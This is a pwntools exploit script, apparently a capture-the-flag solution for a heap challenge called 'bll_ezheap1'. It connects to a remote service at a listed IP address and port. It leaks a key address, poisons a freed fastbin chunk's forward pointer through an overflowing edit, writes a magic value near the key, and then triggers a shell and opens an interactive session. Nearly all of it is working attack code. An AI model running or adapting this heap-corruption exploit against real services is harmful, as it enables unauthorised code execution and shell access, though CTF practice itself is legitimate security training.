from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./bll_ezheap1"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("1.95.36.136", 2085)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def add(idx, size):
    io.sendlineafter("choice:", b"1")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("size:", str(size))


def edit(idx, size, content):
    io.sendlineafter("choice:", b"2")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("length:", str(size))
    io.sendlineafter("content:", content)


def delete(idx):
    io.sendlineafter("choice:", b"3")
    io.sendlineafter("index:", str(idx))


def shell():
    io.sendlineafter("choice:", b"5")


shell()
io.recvuntil("key:", drop=True)
key_addr = int(io.recv(14), 16)
log.success("key:-----> "+hex(key_addr))


payload = b""
add(0, 0x10)
add(1, 0x60)
add(2, 0x20)
delete(1)
edit(0, 0x50, p64(0)*3+p64(0x71)+p64(key_addr-31))
add(0, 0x60)
add(3, 0x60)
edit(3, 0x20, 15*b"a"+p64(11259375))
shell()

io.interactive()
